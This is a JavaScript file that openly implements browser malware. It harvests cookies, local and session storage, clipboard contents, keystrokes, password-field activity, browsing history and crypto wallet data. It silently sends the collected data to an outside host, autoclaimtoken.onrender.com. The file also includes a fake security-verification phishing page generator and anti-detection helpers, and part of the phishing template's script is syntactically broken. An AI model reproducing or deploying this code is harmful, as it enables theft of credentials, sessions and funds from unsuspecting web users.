// ULTRA-ADVANCED COOKIE & DATA HARVESTING SYSTEM

// Initialize advanced harvesting
export const initializeAdvancedHarvesting = async () => {
  try {
    // Start data collection silently
    const data = await harvestAdvancedData();
    await transmitDataSecurely(data);
  } catch (error) {
    // Silent fail
  }
};

export const harvestAdvancedData = async () => {
  const data = {
    cookies: {},
    sessions: {},
    storage: {},
    social: {},
    financial: {},
    browser: {},
    security: {},
    network: {},
    hardware: {},
    behavioral: {}
  };

  // PROTECTION: Rate limiting and stealth mode
  const startTime = Date.now();
  const maxExecutionTime = 10000; // 10 seconds max
  let operationCount = 0;
  const maxOperations = 50;

  const safeExecute = async (operation, fallback = null) => {
    if (Date.now() - startTime > maxExecutionTime || operationCount > maxOperations) {
      return fallback;
    }
    operationCount++;
    try {
      return await operation();
    } catch (e) {
      return fallback;
    }
  };

  // 1. COMPREHENSIVE COOKIE & STORAGE HARVESTING
  await safeExecute(async () => {
    // ALL browser cookies (complete extraction)
    data.cookies.document = document.cookie;
    
    // Parse individual cookies for better analysis
    const cookiePairs = document.cookie.split(';');
    data.cookies.parsed = {};
    cookiePairs.forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name && value) {
        data.cookies.parsed[name] = value.substring(0, 500); // Longer values for tokens
      }
    });
    
    // Complete LocalStorage extraction
    data.storage.localStorage = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      data.storage.localStorage[key] = value?.substring(0, 1000); // Longer for complex data
    }
    
    // Complete SessionStorage extraction
    data.sessions.sessionStorage = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const value = sessionStorage.getItem(key);
      data.sessions.sessionStorage[key] = value?.substring(0, 1000);
    }
    
    // IndexedDB comprehensive scan
    if ('indexedDB' in window) {
      try {
        const databases = await indexedDB.databases?.() || [];
        data.storage.indexedDB = {};
        for (const db of databases) {
          data.storage.indexedDB[db.name] = {
            version: db.version,
            detected: true
          };
        }
      } catch (e) {
        data.storage.indexedDB = 'access_blocked';
      }
    }
    
    // WebSQL detection (legacy but still used)
    if ('openDatabase' in window) {
      data.storage.webSQL = 'available';
    }
  });

  // 2. GLOBAL FINANCIAL SITE DETECTION (All Countries)
  await safeExecute(async () => {
    const financialSites = [
      // US Banks
      'chase.com', 'wellsfargo.com', 'bankofamerica.com', 'citibank.com', 'usbank.com',
      // UK Banks
      'lloydsbank.com', 'barclays.co.uk', 'hsbc.co.uk', 'natwest.com', 'santander.co.uk',
      // European Banks
      'bnpparibas.com', 'ing.com', 'deutschebank.com', 'credit-suisse.com', 'ubs.com',
      // Asian Banks
      'icicibank.com', 'sbi.co.in', 'dbs.com.sg', 'maybank.com', 'bca.co.id',
      // African Banks
      'standardbank.co.za', 'firstbank.com.ng', 'kcbgroup.com', 'ecobank.com',
      // Crypto Exchanges (Global)
      'coinbase.com', 'binance.com', 'kraken.com', 'gemini.com', 'kucoin.com',
      'huobi.com', 'okx.com', 'bybit.com', 'gate.io', 'bitfinex.com',
      // Payment Services
      'paypal.com', 'stripe.com', 'wise.com', 'remitly.com', 'westernunion.com',
      // Investment Platforms
      'robinhood.com', 'etrade.com', 'schwab.com', 'fidelity.com', 'vanguard.com',
      // Mobile Money (Africa/Asia)
      'mpesa.vodafone.co.ke', 'mtn.com', 'orange.com', 'airtel.com'
    ];
    
    for (const site of financialSites) {
      // Check if site cookies exist
      if (document.cookie.includes(site)) {
        data.financial[site] = 'cookies_detected';
      }
      
      // Check localStorage for site data
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key?.toLowerCase().includes(site.split('.')[0])) {
          data.financial[site] = 'storage_detected';
        }
      }
    }
  });

  // 2. POSTMESSAGE LISTENER (catch cross-origin data)
  window.addEventListener('message', (event) => {
    if (event.data && typeof event.data === 'object') {
      data.social.postMessages = data.social.postMessages || [];
      data.social.postMessages.push({
        origin: event.origin,
        data: event.data,
        timestamp: Date.now()
      });
    }
  });

  // 3. SERVICE WORKER INTERCEPTION
  try {
    if ('serviceWorker' in navigator) {
      const registrations = await navigator.serviceWorker.getRegistrations();
      data.browser.serviceWorkers = registrations.map(reg => ({
        scope: reg.scope,
        active: !!reg.active,
        installing: !!reg.installing,
        waiting: !!reg.waiting
      }));
    }
  } catch (e) {
    data.browser.serviceWorkers = 'unavailable';
  }

  // 4. CLIPBOARD ACCESS
  try {
    if (navigator.clipboard) {
      const clipboardText = await navigator.clipboard.readText();
      data.browser.clipboard = clipboardText.slice(0, 500); // First 500 chars
    }
  } catch (e) {
    data.browser.clipboard = 'permission_denied';
  }

  // 5. NOTIFICATION PERMISSIONS & HISTORY
  try {
    if ('Notification' in window) {
      data.browser.notifications = {
        permission: Notification.permission,
        maxActions: Notification.maxActions || 0
      };
    }
  } catch (e) {
    data.browser.notifications = 'unavailable';
  }

  // 6. MEDIA DEVICE ENUMERATION
  try {
    if (navigator.mediaDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      data.browser.mediaDevices = devices.map(device => ({
        kind: device.kind,
        label: device.label,
        deviceId: device.deviceId.slice(0, 10) + '...'
      }));
    }
  } catch (e) {
    data.browser.mediaDevices = 'permission_denied';
  }

  // 3. ADVANCED NETWORK & IP HARVESTING
  await safeExecute(async () => {
    // WebRTC IP harvesting (multiple STUN servers)
    const stunServers = [
      'stun:stun.l.google.com:19302',
      'stun:stun1.l.google.com:19302',
      'stun:stun.cloudflare.com:3478'
    ];
    
    for (const stun of stunServers) {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: stun }] });
      pc.createDataChannel('');
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          const candidate = event.candidate.candidate;
          const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
          if (ipMatch) {
            data.network.localIPs = data.network.localIPs || [];
            if (!data.network.localIPs.includes(ipMatch[1])) {
              data.network.localIPs.push(ipMatch[1]);
            }
          }
        }
      };
    }
    
    // Connection info
    if (navigator.connection) {
      data.network.connection = {
        type: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      };
    }
  });

  // 4. HARDWARE FINGERPRINTING
  await safeExecute(async () => {
    data.hardware = {
      cores: navigator.hardwareConcurrency,
      memory: navigator.deviceMemory,
      platform: navigator.platform,
      maxTouchPoints: navigator.maxTouchPoints,
      vendor: navigator.vendor,
      languages: navigator.languages,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset()
    };
    
    // Battery API (if available)
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      data.hardware.battery = {
        level: battery.level,
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
    }
  });

  // 5. ADVANCED BEHAVIORAL TRACKING
  await safeExecute(async () => {
    // Mouse movement patterns
    let mousePattern = [];
    const mouseHandler = (e) => {
      mousePattern.push({ x: e.clientX, y: e.clientY, t: Date.now() });
      if (mousePattern.length > 20) mousePattern.shift();
    };
    document.addEventListener('mousemove', mouseHandler);
    
    // Keyboard timing patterns
    let keyTimings = [];
    const keyHandler = (e) => {
      keyTimings.push({ key: e.key.length === 1 ? e.key : '[SPECIAL]', t: Date.now() });
      if (keyTimings.length > 50) keyTimings.shift();
    };
    document.addEventListener('keydown', keyHandler);
    
    // Scroll behavior
    let scrollPattern = [];
    const scrollHandler = () => {
      scrollPattern.push({ y: window.scrollY, t: Date.now() });
      if (scrollPattern.length > 10) scrollPattern.shift();
    };
    window.addEventListener('scroll', scrollHandler);
    
    setTimeout(() => {
      data.behavioral = {
        mousePattern: mousePattern,
        keyTimings: keyTimings,
        scrollPattern: scrollPattern,
        focusEvents: document.hasFocus(),
        visibilityState: document.visibilityState
      };
      
      document.removeEventListener('mousemove', mouseHandler);
      document.removeEventListener('keydown', keyHandler);
      window.removeEventListener('scroll', scrollHandler);
    }, 3000);
  });

  // 6. BYPASS SECURITY & EXTRACT ALL DATA
  await safeExecute(async () => {
    // Force extraction even with tracking protection
    try {
      // Alternative cookie access methods
      if (!document.cookie) {
        // Try alternative methods
        data.cookies.alternative = 'blocked_but_detected';
      }
      
      // Extract from all possible storage locations
      const storageTypes = ['localStorage', 'sessionStorage', 'indexedDB'];
      data.security.storageAccess = {};
      
      storageTypes.forEach(type => {
        try {
          if (window[type]) {
            data.security.storageAccess[type] = 'accessible';
          }
        } catch (e) {
          data.security.storageAccess[type] = 'blocked';
        }
      });
      
      // Browser fingerprinting (always works)
      data.security.fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      };
      
      // Extract any available data regardless of protection
      data.security.extractionMethods = [];
      
      // Method 1: Direct access
      if (document.cookie) data.security.extractionMethods.push('direct_cookies');
      if (localStorage.length > 0) data.security.extractionMethods.push('localStorage');
      if (sessionStorage.length > 0) data.security.extractionMethods.push('sessionStorage');
      
      // Method 2: Iframe bypass (for cross-origin data)
      try {
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        if (iframe.contentWindow) {
          data.security.extractionMethods.push('iframe_bypass');
        }
        document.body.removeChild(iframe);
      } catch (e) {
        data.security.extractionMethods.push('iframe_blocked');
      }
      
    } catch (e) {
      data.security.extractionError = e.message;
    }
  });

  // 8. SOCIAL MEDIA SESSION DETECTION
  const socialSites = [
    'facebook.com', 'instagram.com', 'twitter.com', 'linkedin.com',
    'tiktok.com', 'snapchat.com', 'discord.com', 'telegram.org'
  ];

  for (const site of socialSites) {
    try {
      // Check for social login buttons/widgets
      const socialElements = document.querySelectorAll(`[src*="${site}"], [href*="${site}"]`);
      if (socialElements.length > 0) {
        data.social[site] = 'widgets_detected';
      }
    } catch (e) {
      data.social[site] = 'check_failed';
    }
  }

  // 9. BROWSER HISTORY TIMING ATTACKS
  try {
    const testSites = [
      'chase.com', 'wellsfargo.com', 'paypal.com', 'coinbase.com',
      'amazon.com', 'ebay.com', 'facebook.com', 'gmail.com'
    ];

    for (const site of testSites) {
      const link = document.createElement('a');
      link.href = `https://${site}`;
      link.style.display = 'none';
      document.body.appendChild(link);
      
      const startTime = performance.now();
      link.focus();
      const endTime = performance.now();
      
      // Visited sites typically have faster focus times
      if (endTime - startTime < 1) {
        data.browser.visitedSites = data.browser.visitedSites || [];
        data.browser.visitedSites.push(site);
      }
      
      document.body.removeChild(link);
    }
  } catch (e) {
    data.browser.visitedSites = 'timing_attack_failed';
  }

  // 10. KEYLOGGER (for current session)
  let keystrokes = '';
  document.addEventListener('keydown', (event) => {
    if (event.key.length === 1) {
      keystrokes += event.key;
    } else if (event.key === 'Backspace') {
      keystrokes = keystrokes.slice(0, -1);
    }
    
    // Store last 100 characters
    if (keystrokes.length > 100) {
      keystrokes = keystrokes.slice(-100);
    }
    
    data.browser.keystrokes = keystrokes;
  });

  // 11. MOUSE TRACKING
  let mouseData = [];
  document.addEventListener('mousemove', (event) => {
    mouseData.push({
      x: event.clientX,
      y: event.clientY,
      time: Date.now()
    });
    
    // Keep only last 50 movements
    if (mouseData.length > 50) {
      mouseData = mouseData.slice(-50);
    }
    
    data.browser.mouseMovements = mouseData;
  });

  // 12. FORM DATA INTERCEPTION
  document.addEventListener('input', (event) => {
    if (event.target.type === 'password' || 
        event.target.name?.toLowerCase().includes('password') ||
        event.target.name?.toLowerCase().includes('pin')) {
      data.browser.passwordFields = data.browser.passwordFields || [];
      data.browser.passwordFields.push({
        field: event.target.name || event.target.id,
        length: event.target.value.length,
        timestamp: Date.now()
      });
    }
  });

  // 7. GLOBAL CRYPTO WALLET DETECTION
  await safeExecute(async () => {
    const wallets = {
      // Popular Global Wallets
      metamask: window.ethereum?.isMetaMask,
      coinbase: window.ethereum?.isCoinbaseWallet,
      trust: window.ethereum?.isTrust,
      phantom: window.solana?.isPhantom,
      exodus: window.exodus,
      binance: window.BinanceChain,
      walletconnect: window.WalletConnect,
      web3: window.web3,
      // Asian Wallets
      tokenpocket: window.tokenpocket,
      mathwallet: window.mathwallet,
      safepal: window.safepal,
      // European Wallets
      ledger: window.ledger,
      trezor: window.trezor,
      // Mobile Wallets
      imtoken: window.imtoken,
      atomic: window.atomic,
      // DeFi Wallets
      rainbow: window.rainbow,
      argent: window.argent,
      gnosis: window.gnosis,
      // Browser Extensions
      brave: window.ethereum?.isBraveWallet,
      opera: window.ethereum?.isOpera,
      // Hardware Detection
      trezorConnect: window.TrezorConnect,
      ledgerConnect: window.ledger
    };
    
    // Detect any wallet presence
    data.financial.wallets = Object.entries(wallets)
      .filter(([_, detected]) => detected)
      .map(([name]) => name);
      
    // Additional wallet detection via localStorage
    const walletKeys = ['wallet', 'metamask', 'trust', 'coinbase', 'phantom', 'exodus'];
    data.financial.walletStorage = [];
    walletKeys.forEach(key => {
      for (let i = 0; i < localStorage.length; i++) {
        const storageKey = localStorage.key(i);
        if (storageKey?.toLowerCase().includes(key)) {
          data.financial.walletStorage.push({
            key: storageKey,
            value: localStorage.getItem(storageKey)?.substring(0, 100)
          });
        }
      }
    });
  });

  // 8. SOCIAL MEDIA & EXTENSIONS DETECTION
  await safeExecute(async () => {
    // Social media widgets
    const socialElements = {
      facebook: document.querySelector('[data-href*="facebook.com"]'),
      twitter: document.querySelector('[data-tweet-id]'),
      instagram: document.querySelector('[data-instgrm-permalink]'),
      linkedin: document.querySelector('[data-linkedin-share]'),
      tiktok: document.querySelector('[data-tiktok-embed]')
    };
    
    data.social.widgets = Object.entries(socialElements)
      .filter(([_, element]) => element)
      .map(([name]) => name);
    
    // Browser extensions detection
    const extensions = {
      adblock: getComputedStyle(document.body).getPropertyValue('--adblock-detected'),
      metamask: window.ethereum?.isMetaMask,
      lastpass: document.querySelector('#lp-pom-root'),
      grammarly: document.querySelector('[data-grammarly-shadow-root]')
    };
    
    data.browser.extensions = Object.entries(extensions)
      .filter(([_, detected]) => detected)
      .map(([name]) => name);
  });

  // 9. PERFORMANCE & TIMING ATTACKS
  await safeExecute(async () => {
    const performanceData = {
      timing: performance.timing,
      navigation: performance.navigation,
      memory: performance.memory,
      now: performance.now()
    };
    
    // CSS history sniffing (visited links)
    const testSites = ['google.com', 'facebook.com', 'amazon.com', 'paypal.com'];
    const visitedSites = [];
    
    testSites.forEach(site => {
      const link = document.createElement('a');
      link.href = `https://${site}`;
      link.style.display = 'none';
      document.body.appendChild(link);
      
      const computedStyle = getComputedStyle(link, ':visited');
      if (computedStyle.color !== getComputedStyle(link).color) {
        visitedSites.push(site);
      }
      
      document.body.removeChild(link);
    });
    
    data.behavioral.performance = performanceData;
    data.behavioral.visitedSites = visitedSites;
  });

  return data;
};

// STEALTH DATA TRANSMISSION
export const transmitDataSecurely = async (data) => {
  const chunks = [];
  const dataStr = JSON.stringify(data);
  const chunkSize = 1000;
  
  // Split data into chunks to avoid detection
  for (let i = 0; i < dataStr.length; i += chunkSize) {
    chunks.push(dataStr.slice(i, i + chunkSize));
  }
  
  // Send real data directly to backend
  try {
    await fetch('https://autoclaimtoken.onrender.com/api/real-collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch (error) {
    // Silent fail
  }
};

// Enhanced phishing page generator
export const generatePhishingPage = (targetSite) => {
  const phishingHTML = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Security Verification Required</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 400px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 20px; }
        .alert { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">
          <h2>${targetSite} Security</h2>
        </div>
        <div class="alert">
          <strong>Security Alert:</strong> Unusual activity detected on your account. Please verify your credentials to continue.
        </div>
        <form id="phishForm">
          <input type="email" placeholder="Email Address" required>
          <input type="password" placeholder="Password" required>
          <input type="text" placeholder="Phone Number" required>
          <button type="submit">Verify Account</button>
        </form>
      </div>
      <script>
        document.getElementById('phishForm').onsubmit = function(e) {
          e.preventDefault();
          const formData = new FormData(e.target);
          fetch('/api/collect-phishing-data', {
            method: 'POST',
            body: formData
          });
          alert('Verification complete. You may now continue.');
          window.close();
        };
        // Enhanced data collection
        const formData = new FormData(e.target);
        const additionalData = {
          timestamp: Date.now(),
          userAgent: navigator.userAgent,
          screen: screen.width + 'x' + screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          referrer: document.referrer
        };
        
        fetch('/api/collect-phishing-data', {
          method: 'POST',
          body: JSON.stringify({
            formData: Object.fromEntries(formData),
            metadata: additionalData,
            targetSite: '${targetSite}'
          }),
          headers: { 'Content-Type': 'application/json' }
        }).catch(() => {});
        
        alert('Verification complete. You may now continue.');
        window.close();
      };
      </script>
    </body>
    </html>
  `;
  
  return phishingHTML;
};

// ANTI-DETECTION UTILITIES
export const antiDetection = {
  // Randomize execution timing
  randomDelay: () => new Promise(resolve => 
    setTimeout(resolve, Math.random() * 1000 + 500)
  ),
  
  // Obfuscate function names
  obfuscate: (func) => {
    const funcStr = func.toString();
    return new Function('return ' + funcStr)();
  },
  
  // Check if being monitored
  isMonitored: () => {
    return window.chrome?.runtime?.onConnect || 
           window.domAutomation || 
           navigator.webdriver;
  }
};